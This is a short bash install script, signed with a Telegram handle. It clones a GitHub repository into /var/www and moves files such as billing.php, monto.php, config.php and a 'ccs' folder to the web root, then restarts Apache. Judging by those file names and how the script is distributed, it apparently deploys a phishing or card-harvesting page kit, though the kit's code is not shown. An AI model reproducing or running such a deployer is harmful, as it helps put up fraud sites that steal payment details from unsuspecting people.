#!/bin/bash
#
# Created by: @K41S3RR - https://t.me/K41S3RR
#
# ==============================================
cd /var/www; git clone https://github.com/resekk-vps/direct
cd /var/www/direct; mv ccs /var/www; mv data /var/www; mv estilos /var/www; mv imagenes /var/www; mv billing.php /var/www; mv config.php /var/www; mv error.php /var/www; mv index.html /var/www; mv monto.php /var/www
cd /var/www; nano config.php
sudo service apache2 restart
#BANNER
clear && clear; cowsay -f eyes "SCRIPT FINALIZADA" | lolcat && figlet -f slant "RESEKK VPS" | lolcat
